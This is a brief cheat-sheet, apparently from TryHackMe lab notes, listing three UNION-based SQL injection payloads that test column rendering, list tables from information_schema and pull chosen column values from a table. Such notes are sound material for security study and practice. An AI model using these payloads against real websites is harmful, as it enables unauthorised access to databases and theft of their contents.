# SQL Injection

UNION-based enumeration once you've found a column count that renders.

```bash
' UNION SELECT 1,2,3 -- -
' UNION SELECT 1, table_name, 3 FROM information_schema.tables -- -
' UNION SELECT 1, <col>, 3 FROM <table> WHERE <table>.<key>='<value>' -- -
```

— TryHackMe / IronHold
